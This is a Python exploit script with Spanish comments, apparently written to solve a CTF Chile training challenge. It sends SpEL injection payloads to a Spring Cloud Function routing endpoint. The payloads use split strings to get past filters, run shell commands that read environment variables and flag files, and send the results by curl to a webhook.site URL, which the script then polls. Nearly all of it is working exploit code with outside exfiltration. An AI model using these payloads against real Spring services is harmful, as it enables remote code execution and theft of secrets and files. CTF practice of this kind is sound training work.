#!/usr/bin/env python3
"""
CTF Chile - SpEL simple para evitar filtros
"""
import requests
import time

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def test_spel(name, expression):
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": expression,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [{name}] HTTP {r.status_code}")
        return r.status_code
    except Exception as e:
        print(f"    [{name}] Error: {e}")
        return None

print("[*] Probando expresiones SpEL simples...")

# Expresiones básicas que funcionaron antes
basic_cmd = 'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{"/bin/sh","-c","echo test | curl -s ' + WH + '/test1 --data @-"}).waitFor()'
test_spel("test_basic", basic_cmd)

# Intentar acceder a propiedades del sistema directamente
prop_cmd = 'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{"/bin/sh","-c","env | grep -i flag | curl -s ' + WH + '/env_flag --data @-"}).waitFor()'
test_spel("env_flag", prop_cmd)

# Buscar archivos flag de manera directa
find_cmd = 'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{"/bin/sh","-c","find / -name flag.txt 2>/dev/null | xargs cat | curl -s ' + WH + '/flag_file --data @-"}).waitFor()'
test_spel("find_flag", find_cmd)

# Leer archivos específicos que podrían contener flags
read_files = [
    "/flag.txt",
    "/app/flag.txt",
    "/root/flag.txt",
    "/tmp/flag.txt",
    "/var/flag.txt"
]

for file_path in read_files:
    file_safe = file_path.replace("/", "_")
    read_cmd = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{".class"}}).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","cat {file_path} 2>/dev/null | curl -s {WH}/file{file_safe} --data @-"}}).waitFor()'
    test_spel(f"read{file_safe}", read_cmd)

print("[*] Esperando 8 segundos...")
time.sleep(8)

print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=20", timeout=10)
data = r.json().get("data", [])

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]

    # Obtener contenido del cuerpo de la petición
    content = req.get("content", "")

    print("=" * 50)
    print(f"ENDPOINT: {path}")
    if content:
        print(f"CONTENIDO: {content}")

        # Buscar flags
        if "ctfchile{" in content.lower():
            print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")
            print(f"FLAG: {content}")
    else:
        print("(sin contenido)")

print(f"\n[*] Revisar manualmente: https://webhook.site/#!/{UUID}")